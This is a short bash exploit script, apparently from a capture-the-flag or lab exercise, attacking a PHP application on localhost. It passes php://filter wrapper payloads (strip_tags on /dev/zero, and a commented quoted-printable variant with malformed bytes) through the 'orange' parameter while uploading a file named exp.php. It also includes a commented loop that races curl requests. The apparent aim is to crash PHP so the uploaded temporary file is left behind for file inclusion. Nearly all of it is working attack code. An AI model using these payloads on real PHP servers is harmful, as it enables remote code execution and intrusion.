#!/bin/bash

# for i in `seq 1 100`
# do {
# 	curl http://127.0.0.1:8002/index.php\?orange\=http://google.com -F file=@exp.php
# 	sleep 1
# 	killall curl
# } &
# done

# Array
# (
#     [0] => zlib.*
#     [1] => string.rot13
#     [2] => string.toupper
#     [3] => string.tolower
#     [4] => string.strip_tags
#     [5] => convert.*
#     [6] => consumed
#     [7] => dechunk
#     [8] => convert.iconv.*
# )

pl='php://filter/string.strip_tags/resource=/dev/zero'
# pl='php://filter/convert.quoted-printable-encode/resource=data://,%bf%f1AAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAA'
curl -vv -s "http://127.0.0.1:8002/test.php?orange=$pl" -F file=@exp.php --connect-timeout 1 --expect100-timeout 1
# curl -vv -s "http://127.0.0.1:8002/index.php?orange=/dev/zero" -F file=@exp.php